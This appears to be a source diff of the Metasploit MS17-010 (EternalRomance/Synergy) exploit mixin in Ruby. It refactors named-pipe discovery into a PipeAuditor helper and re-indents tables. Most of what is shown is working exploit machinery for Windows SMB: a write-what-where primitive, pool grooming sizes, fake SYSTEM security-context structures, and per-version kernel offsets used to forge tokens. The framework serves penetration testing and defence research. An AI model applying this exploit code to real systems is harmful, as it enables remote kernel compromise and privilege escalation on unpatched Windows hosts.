@@ -1,8 +1,8 @@
 module Msf
-
 module Exploit::Remote::SMB::Client::Psexec_MS17_010
 
   include Msf::Exploit::Remote::SMB::Client::Psexec
+  include Msf::Exploit::Remote::SMB::Client::PipeAuditor
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
@@ -231,7 +231,6 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
     return userAndGroupsAddr, userAndGroupCount
   end
 
-
   def write_what_where(what, where)
     if where == 0
       raise MS17_010_Error, 'Attempted to write to a NULL pointer!'
@@ -331,26 +330,17 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
     end
   end
 
-  def find_accessible_named_pipe()
-    pipes = if datastore['NAMEDPIPE'] != '' then [datastore['NAMEDPIPE']] else @@target_pipes end
+  def find_accessible_named_pipe
+    @ctx['pipe_name'], pipe_handle = check_named_pipes(
+      check_first:  datastore['NAMEDPIPE'],
+      return_first: true
+    )
 
-    pipes.each do |pipe|
-      begin
-        pipe_name = "#{pipe}"
-        pipe_handle = self.simple.create_pipe(pipe_name, 'o')
-
-        # if we make it this far, it succeeded
-        vprint_status("Connected to named pipe: #{pipe}")
-
-        @ctx['pipe_name'] = pipe_name
-        return pipe_handle
-
-     rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
-        vprint_error("Inaccessible named pipe: #{pipe} - #{e.message}")
-      end
+    if @ctx['pipe_name'] && pipe_handle
+      pipe_handle
+    else
+      raise MS17_010_Error, 'Unable to find accessible named pipe!'
     end
-
-    raise MS17_010_Error, "Unable to find accessible named pipe!"
   end
 
   # todo: spice it up with EternalSynergy output
@@ -368,14 +358,12 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
     # groom: srv buffer header
     @ctx['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + @ctx['SRV_BUFHDR_SIZE'] + @ctx['POOL_ALIGN'], @ctx['POOL_ALIGN'])
 
-
     # groom paramters and data is alignment by 8 because it is NT_TRANS
     @ctx['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - @ctx['TRANS_SIZE']  # alignment (4)
 
     # bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)
     bridePoolSize = 0x1000 - (@ctx['GROOM_POOL_SIZE'] & 0xfff) - @ctx['FRAG_POOL_SIZE']
     @ctx['BRIDE_TRANS_SIZE'] = bridePoolSize - (@ctx['SRV_BUFHDR_SIZE'] + @ctx['POOL_ALIGN'])
-
 
     if datastore['DBGTRACE']
       print_status("GROOM_POOL_SIZE: 0x#{@ctx['GROOM_POOL_SIZE'].to_s(16)}")
@@ -390,7 +378,6 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
     # ================================
     for i in 0..datastore['LEAKATTEMPTS']
       reset_extra_multiplex_id()
-
 
       vprint_status("Attempting leak ##{i.to_s}")
 
@@ -415,7 +402,6 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
       self.simple.client.tree_connect("\\\\#{@ctx['ip']}\\IPC$")
       pipe_handle = self.simple.create_pipe(@ctx['pipe_name'], 'o')
     end
-
 
     @ctx['fid'] = pipe_handle.file_id
     @ctx['pipe_handle'] = pipe_handle
@@ -699,7 +685,6 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
 
     end
 
-
     if not success
       print_status("<---------------- | Leaving Danger Zone | ---------------->")
       raise MS17_010_Error, "Unable to control groom transaction"
@@ -822,7 +807,6 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
     @ctx['trans2_mid'] = trans2_mid
     @ctx['trans2_addr'] = trans2_addr
   end
-
 
   def create_fake_SYSTEM_UserAndGroups(userAndGroupCount, userAndGroupsAddr)
     xSID_SYSTEM =  "\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00" # pack('<BB5xB'+'I', 1, 1, 5, 18)
@@ -1182,254 +1166,222 @@ module Exploit::Remote::SMB::Client::Psexec_MS17_010
     return (size + align_size - 1) & ~(align_size - 1)
   end
 
+  WIN7_64_SESSION_INFO = {
+    'SESSION_SECCTX_OFFSET'=> 0xa0,
+    'SESSION_ISNULL_OFFSET'=> 0xba,
+    'FAKE_SECCTX'=>  [0x28022a, 1, 0, 0, 2, 0, 1].pack("VVQ<Q<VVC"), #pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
+    'SECCTX_SIZE'=> 0x28,
+  }
 
-    # we will iter these if one is not specified
-    @@target_pipes = [
-      'netlogon',
-      'lsarpc',
-      'samr',
-      'browser',
-      'atsvc',
-      'DAV RPC SERVICE',
-      'epmapper',
-      'eventlog',
-      'InitShutdown',
-      'keysvc',
-      'lsass',
-      'LSM_API_service',
-      'ntsvcs',
-      'plugplay',
-      'protected_storage',
-      'router',
-      'SapiServerPipeS-1-5-5-0-70123',
-      'scerpc',
-      'srvsvc',
-      'tapsrv',
-      'trkwks',
-      'W32TIME_ALT',
-      'wkssvc',
-      'PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER',
-      'db2remotecmd'
-    ]
+  WIN7_32_SESSION_INFO = {
+    'SESSION_SECCTX_OFFSET'=> 0x80,
+    'SESSION_ISNULL_OFFSET'=> 0x96,
+    'FAKE_SECCTX'=>  [0x1c022a, 1, 0, 0, 2, 0, 1].pack("VVVVVVC"), #pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
+    'SECCTX_SIZE'=> 0x1c,
+  }
 
-    WIN7_64_SESSION_INFO = {
-      'SESSION_SECCTX_OFFSET'=> 0xa0,
-      'SESSION_ISNULL_OFFSET'=> 0xba,
-      'FAKE_SECCTX'=>  [0x28022a, 1, 0, 0, 2, 0, 1].pack("VVQ<Q<VVC"), #pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
-      'SECCTX_SIZE'=> 0x28,
-    }
+  # win8+ info
+  WIN8_64_SESSION_INFO = {
+    'SESSION_SECCTX_OFFSET'=> 0xb0,
+    'SESSION_ISNULL_OFFSET'=> 0xca,
+    'FAKE_SECCTX'=> [0x38022a, 1, 0, 0, 0, 0, 2, 0, 1].pack("VVQ<Q<Q<Q<VVC"), #pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
+    'SECCTX_SIZE'=> 0x38,
+  }
 
-    WIN7_32_SESSION_INFO = {
-      'SESSION_SECCTX_OFFSET'=> 0x80,
-      'SESSION_ISNULL_OFFSET'=> 0x96,
-      'FAKE_SECCTX'=>  [0x1c022a, 1, 0, 0, 2, 0, 1].pack("VVVVVVC"), #pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
-      'SECCTX_SIZE'=> 0x1c,
-    }
+  WIN8_32_SESSION_INFO = {
+    'SESSION_SECCTX_OFFSET'=> 0x88,
+    'SESSION_ISNULL_OFFSET'=> 0x9e,
+    'FAKE_SECCTX'=> [0x24022a, 1, 0, 0, 0, 0, 2, 0, 1].pack("VVVVVVVVC"), # pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
+    'SECCTX_SIZE'=> 0x24,
+  }
 
-    # win8+ info
-    WIN8_64_SESSION_INFO = {
-      'SESSION_SECCTX_OFFSET'=> 0xb0,
-      'SESSION_ISNULL_OFFSET'=> 0xca,
-      'FAKE_SECCTX'=> [0x38022a, 1, 0, 0, 0, 0, 2, 0, 1].pack("VVQ<Q<Q<Q<VVC"), #pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
-      'SECCTX_SIZE'=> 0x38,
-    }
+  # win 2003 (xp 64 bit is win 2003)
+  WIN2K3_64_SESSION_INFO = {
+    'SESSION_ISNULL_OFFSET'=> 0xba,
+    'SESSION_SECCTX_OFFSET'=> 0xa0,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
+    'SECCTX_PCTXTHANDLE_OFFSET'=> 0x10,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
+    'PCTXTHANDLE_TOKEN_OFFSET'=> 0x40,
+    'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x4c,
+    'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x68,
+  }
 
-    WIN8_32_SESSION_INFO = {
-      'SESSION_SECCTX_OFFSET'=> 0x88,
-      'SESSION_ISNULL_OFFSET'=> 0x9e,
-      'FAKE_SECCTX'=> [0x24022a, 1, 0, 0, 0, 0, 2, 0, 1].pack("VVVVVVVVC"), # pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
-      'SECCTX_SIZE'=> 0x24,
-    }
+  WIN2K3_32_SESSION_INFO = {
+    'SESSION_ISNULL_OFFSET'=> 0x96,
+    'SESSION_SECCTX_OFFSET'=> 0x80,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
+    'SECCTX_PCTXTHANDLE_OFFSET'=> 0xc,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
+    'PCTXTHANDLE_TOKEN_OFFSET'=> 0x24,
+    'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x4c,
+    'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x68,
+  }
 
-    # win 2003 (xp 64 bit is win 2003)
-    WIN2K3_64_SESSION_INFO = {
-      'SESSION_ISNULL_OFFSET'=> 0xba,
-      'SESSION_SECCTX_OFFSET'=> 0xa0,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
-      'SECCTX_PCTXTHANDLE_OFFSET'=> 0x10,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
-      'PCTXTHANDLE_TOKEN_OFFSET'=> 0x40,
-      'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x4c,
-      'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x68,
-    }
+  # win xp
+  WINXP_32_SESSION_INFO = {
+    'SESSION_ISNULL_OFFSET'=> 0x94,
+    'SESSION_SECCTX_OFFSET'=> 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
+    'PCTXTHANDLE_TOKEN_OFFSET'=> 0x24,
+    'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x4c,
+    'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x68,
+    'TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1'=> 0x40,
+    'TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1'=> 0x5c,
+  }
 
-    WIN2K3_32_SESSION_INFO = {
-      'SESSION_ISNULL_OFFSET'=> 0x96,
-      'SESSION_SECCTX_OFFSET'=> 0x80,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
-      'SECCTX_PCTXTHANDLE_OFFSET'=> 0xc,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
-      'PCTXTHANDLE_TOKEN_OFFSET'=> 0x24,
-      'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x4c,
-      'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x68,
-    }
+  WIN2K_32_SESSION_INFO = {
+    'SESSION_ISNULL_OFFSET'=> 0x94,
+    'SESSION_SECCTX_OFFSET'=> 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
+    'PCTXTHANDLE_TOKEN_OFFSET'=> 0x24,
+    'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x3c,
+    'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x58,
+  }
 
-    # win xp
-    WINXP_32_SESSION_INFO = {
-      'SESSION_ISNULL_OFFSET'=> 0x94,
-      'SESSION_SECCTX_OFFSET'=> 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
-      'PCTXTHANDLE_TOKEN_OFFSET'=> 0x24,
-      'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x4c,
-      'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x68,
-      'TOKEN_USER_GROUP_CNT_OFFSET_SP0_SP1'=> 0x40,
-      'TOKEN_USER_GROUP_ADDR_OFFSET_SP0_SP1'=> 0x5c,
-    }
+  # for windows 2008+
+  WIN7_32_TRANS_INFO = {
+    'TRANS_SIZE' => 0xa0,  # struct size
+    'TRANS_FLINK_OFFSET' => 0x18,
+    'TRANS_INPARAM_OFFSET' => 0x40,
+    'TRANS_OUTPARAM_OFFSET' => 0x44,
+    'TRANS_INDATA_OFFSET' => 0x48,
+    'TRANS_OUTDATA_OFFSET' => 0x4c,
+    'TRANS_PARAMCNT_OFFSET' => 0x58,
+    'TRANS_TOTALPARAMCNT_OFFSET' => 0x5c,
+    'TRANS_FUNCTION_OFFSET' => 0x72,
+    'TRANS_MID_OFFSET' => 0x80,
+  }
 
-    WIN2K_32_SESSION_INFO = {
-      'SESSION_ISNULL_OFFSET'=> 0x94,
-      'SESSION_SECCTX_OFFSET'=> 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
-      'PCTXTHANDLE_TOKEN_OFFSET'=> 0x24,
-      'TOKEN_USER_GROUP_CNT_OFFSET'=> 0x3c,
-      'TOKEN_USER_GROUP_ADDR_OFFSET'=> 0x58,
-    }
+  WIN7_64_TRANS_INFO = {
+    'TRANS_SIZE' => 0xf8,  # struct size
+    'TRANS_FLINK_OFFSET' => 0x28,
+    'TRANS_INPARAM_OFFSET' => 0x70,
+    'TRANS_OUTPARAM_OFFSET' => 0x78,
+    'TRANS_INDATA_OFFSET' => 0x80,
+    'TRANS_OUTDATA_OFFSET' => 0x88,
+    'TRANS_PARAMCNT_OFFSET' => 0x98,
+    'TRANS_TOTALPARAMCNT_OFFSET' => 0x9c,
+    'TRANS_FUNCTION_OFFSET' => 0xb2,
+    'TRANS_MID_OFFSET' => 0xc0,
+  }
 
-    # for windows 2008+
-    WIN7_32_TRANS_INFO = {
-      'TRANS_SIZE' => 0xa0,  # struct size
-      'TRANS_FLINK_OFFSET' => 0x18,
-      'TRANS_INPARAM_OFFSET' => 0x40,
-      'TRANS_OUTPARAM_OFFSET' => 0x44,
-      'TRANS_INDATA_OFFSET' => 0x48,
-      'TRANS_OUTDATA_OFFSET' => 0x4c,
-      'TRANS_PARAMCNT_OFFSET' => 0x58,
-      'TRANS_TOTALPARAMCNT_OFFSET' => 0x5c,
-      'TRANS_FUNCTION_OFFSET' => 0x72,
-      'TRANS_MID_OFFSET' => 0x80,
-    }
+  WIN5_32_TRANS_INFO = {
+    'TRANS_SIZE' => 0x98,  # struct size
+    'TRANS_FLINK_OFFSET' => 0x18,
+    'TRANS_INPARAM_OFFSET' => 0x3c,
+    'TRANS_OUTPARAM_OFFSET' => 0x40,
+    'TRANS_INDATA_OFFSET' => 0x44,
+    'TRANS_OUTDATA_OFFSET' => 0x48,
+    'TRANS_PARAMCNT_OFFSET' => 0x54,
+    'TRANS_TOTALPARAMCNT_OFFSET' => 0x58,
+    'TRANS_FUNCTION_OFFSET' => 0x6e,
+    'TRANS_PID_OFFSET' => 0x78,
+    'TRANS_MID_OFFSET' => 0x7c,
+  }
 
-    WIN7_64_TRANS_INFO = {
-      'TRANS_SIZE' => 0xf8,  # struct size
-      'TRANS_FLINK_OFFSET' => 0x28,
-      'TRANS_INPARAM_OFFSET' => 0x70,
-      'TRANS_OUTPARAM_OFFSET' => 0x78,
-      'TRANS_INDATA_OFFSET' => 0x80,
-      'TRANS_OUTDATA_OFFSET' => 0x88,
-      'TRANS_PARAMCNT_OFFSET' => 0x98,
-      'TRANS_TOTALPARAMCNT_OFFSET' => 0x9c,
-      'TRANS_FUNCTION_OFFSET' => 0xb2,
-      'TRANS_MID_OFFSET' => 0xc0,
-    }
+  WIN5_64_TRANS_INFO = {
+    'TRANS_SIZE' => 0xe0,  # struct size
+    'TRANS_FLINK_OFFSET' => 0x28,
+    'TRANS_INPARAM_OFFSET' => 0x68,
+    'TRANS_OUTPARAM_OFFSET' => 0x70,
+    'TRANS_INDATA_OFFSET' => 0x78,
+    'TRANS_OUTDATA_OFFSET' => 0x80,
+    'TRANS_PARAMCNT_OFFSET' => 0x90,
+    'TRANS_TOTALPARAMCNT_OFFSET' => 0x94,
+    'TRANS_FUNCTION_OFFSET' => 0xaa,
+    'TRANS_PID_OFFSET' => 0xb4,
+    'TRANS_MID_OFFSET' => 0xb8,
+  }
 
-    WIN5_32_TRANS_INFO = {
-      'TRANS_SIZE' => 0x98,  # struct size
-      'TRANS_FLINK_OFFSET' => 0x18,
-      'TRANS_INPARAM_OFFSET' => 0x3c,
-      'TRANS_OUTPARAM_OFFSET' => 0x40,
-      'TRANS_INDATA_OFFSET' => 0x44,
-      'TRANS_OUTDATA_OFFSET' => 0x48,
-      'TRANS_PARAMCNT_OFFSET' => 0x54,
-      'TRANS_TOTALPARAMCNT_OFFSET' => 0x58,
-      'TRANS_FUNCTION_OFFSET' => 0x6e,
-      'TRANS_PID_OFFSET' => 0x78,
-      'TRANS_MID_OFFSET' => 0x7c,
-    }
+  X86_INFO = {
+    'ARCH' => 'x86',
+    'PTR_SIZE' => 4,
+    'PTR_FMT' => 'V',
+    'FRAG_TAG_OFFSET' => 12,
+    'POOL_ALIGN' => 8,
+    'SRV_BUFHDR_SIZE' => 8,
+  }
 
-    WIN5_64_TRANS_INFO = {
-      'TRANS_SIZE' => 0xe0,  # struct size
-      'TRANS_FLINK_OFFSET' => 0x28,
-      'TRANS_INPARAM_OFFSET' => 0x68,
-      'TRANS_OUTPARAM_OFFSET' => 0x70,
-      'TRANS_INDATA_OFFSET' => 0x78,
-      'TRANS_OUTDATA_OFFSET' => 0x80,
-      'TRANS_PARAMCNT_OFFSET' => 0x90,
-      'TRANS_TOTALPARAMCNT_OFFSET' => 0x94,
-      'TRANS_FUNCTION_OFFSET' => 0xaa,
-      'TRANS_PID_OFFSET' => 0xb4,
-      'TRANS_MID_OFFSET' => 0xb8,
-    }
+  X64_INFO = {
+    'ARCH' => 'x64',
+    'PTR_SIZE' => 8,
+    'PTR_FMT' => 'Q<',
+    'FRAG_TAG_OFFSET' => 0x14,
+    'POOL_ALIGN' => 0x10,
+    'SRV_BUFHDR_SIZE' => 0x10,
+  }
 
-    X86_INFO = {
-      'ARCH' => 'x86',
-      'PTR_SIZE' => 4,
-      'PTR_FMT' => 'V',
-      'FRAG_TAG_OFFSET' => 12,
-      'POOL_ALIGN' => 8,
-      'SRV_BUFHDR_SIZE' => 8,
-    }
-
-    X64_INFO = {
-      'ARCH' => 'x64',
-      'PTR_SIZE' => 8,
-      'PTR_FMT' => 'Q<',
-      'FRAG_TAG_OFFSET' => 0x14,
-      'POOL_ALIGN' => 0x10,
-      'SRV_BUFHDR_SIZE' => 0x10,
-    }
-
-    OS_ARCH_INFO = {
-      # for Windows Vista, 2008, 7 and 2008 R2
-      'WIN7' => {
-        'x86' => {
-          'CPUARCH' => X86_INFO,
-          'OFFSETS' => WIN7_32_TRANS_INFO,
-          'SESSION' => WIN7_32_SESSION_INFO
-        },
-        'x64' => {
-          'CPUARCH' => X64_INFO,
-          'OFFSETS' => WIN7_64_TRANS_INFO,
-          'SESSION' => WIN7_64_SESSION_INFO
-        },
+  OS_ARCH_INFO = {
+    # for Windows Vista, 2008, 7 and 2008 R2
+    'WIN7' => {
+      'x86' => {
+        'CPUARCH' => X86_INFO,
+        'OFFSETS' => WIN7_32_TRANS_INFO,
+        'SESSION' => WIN7_32_SESSION_INFO
       },
-      # for Windows 8 and later
-      'WIN8' => {
-        'x86' => {
-          'CPUARCH' => X86_INFO,
-          'OFFSETS' => WIN7_32_TRANS_INFO,
-          'SESSION' => WIN8_32_SESSION_INFO
-        },
-        'x64' => {
-          'CPUARCH' => X64_INFO,
-          'OFFSETS' => WIN7_64_TRANS_INFO,
-          'SESSION' => WIN8_64_SESSION_INFO
-        },
+      'x64' => {
+        'CPUARCH' => X64_INFO,
+        'OFFSETS' => WIN7_64_TRANS_INFO,
+        'SESSION' => WIN7_64_SESSION_INFO
       },
-      'WINXP' => {
-        'x86' => {
-          'CPUARCH' => X86_INFO,
-          'OFFSETS' => WIN5_32_TRANS_INFO,
-          'SESSION' => WINXP_32_SESSION_INFO
-        },
-        'x64' => {
-          'CPUARCH' => X64_INFO,
-          'OFFSETS' => WIN5_64_TRANS_INFO,
-          'SESSION' => WIN2K3_64_SESSION_INFO
-        },
+    },
+    # for Windows 8 and later
+    'WIN8' => {
+      'x86' => {
+        'CPUARCH' => X86_INFO,
+        'OFFSETS' => WIN7_32_TRANS_INFO,
+        'SESSION' => WIN8_32_SESSION_INFO
       },
-      'WIN2K3' => {
-        'x86' => {
-          'CPUARCH' => X86_INFO,
-          'OFFSETS' => WIN5_32_TRANS_INFO,
-          'SESSION' => WIN2K3_32_SESSION_INFO
-        },
-        'x64' => {
-          'CPUARCH' => X64_INFO,
-          'OFFSETS' => WIN5_64_TRANS_INFO,
-          'SESSION' => WIN2K3_64_SESSION_INFO
-        },
+      'x64' => {
+        'CPUARCH' => X64_INFO,
+        'OFFSETS' => WIN7_64_TRANS_INFO,
+        'SESSION' => WIN8_64_SESSION_INFO
       },
-      'WIN2K' => {
-        'x86' => {
-          'CPUARCH' => X86_INFO,
-          'OFFSETS' => WIN5_32_TRANS_INFO,
-          'SESSION' => WIN2K_32_SESSION_INFO
-        },
+    },
+    'WINXP' => {
+      'x86' => {
+        'CPUARCH' => X86_INFO,
+        'OFFSETS' => WIN5_32_TRANS_INFO,
+        'SESSION' => WINXP_32_SESSION_INFO
       },
-    }
+      'x64' => {
+        'CPUARCH' => X64_INFO,
+        'OFFSETS' => WIN5_64_TRANS_INFO,
+        'SESSION' => WIN2K3_64_SESSION_INFO
+      },
+    },
+    'WIN2K3' => {
+      'x86' => {
+        'CPUARCH' => X86_INFO,
+        'OFFSETS' => WIN5_32_TRANS_INFO,
+        'SESSION' => WIN2K3_32_SESSION_INFO
+      },
+      'x64' => {
+        'CPUARCH' => X64_INFO,
+        'OFFSETS' => WIN5_64_TRANS_INFO,
+        'SESSION' => WIN2K3_64_SESSION_INFO
+      },
+    },
+    'WIN2K' => {
+      'x86' => {
+        'CPUARCH' => X86_INFO,
+        'OFFSETS' => WIN5_32_TRANS_INFO,
+        'SESSION' => WIN2K_32_SESSION_INFO
+      },
+    },
+  }
 
-    def pick_ctx()
-      pick = OS_ARCH_INFO[@ctx['os']][@ctx['arch']]
-      @ctx = @ctx.merge(pick['CPUARCH'])
-      @ctx = @ctx.merge(pick['OFFSETS'])
-      @ctx = @ctx.merge(pick['SESSION'])
-      @ctx
-    end
+  def pick_ctx()
+    pick = OS_ARCH_INFO[@ctx['os']][@ctx['arch']]
+    @ctx = @ctx.merge(pick['CPUARCH'])
+    @ctx = @ctx.merge(pick['OFFSETS'])
+    @ctx = @ctx.merge(pick['SESSION'])
+    @ctx
+  end
 
+  GROOM_TRANS_SIZE = 0x5010   #  includes transaction name, parameters and data, multiple of 16 to make FRAG_TAG_OFFSET valid
+  TRANS_NAME_LEN = 4
 
-    GROOM_TRANS_SIZE = 0x5010   #  includes transaction name, parameters and data, multiple of 16 to make FRAG_TAG_OFFSET valid
-    TRANS_NAME_LEN = 4
+  X64_FRAG_TAG_OFFSET = 0x14
+  X64_POOL_ALIGN = 0x10
 
-    X64_FRAG_TAG_OFFSET = 0x14
-    X64_POOL_ALIGN = 0x10
-
-    X86_FRAG_TAG_OFFSET = 0x0c
-    X86_POOL_ALIGN = 0x08
+  X86_FRAG_TAG_OFFSET = 0x0c
+  X86_POOL_ALIGN = 0x08
 
 end
-
 end
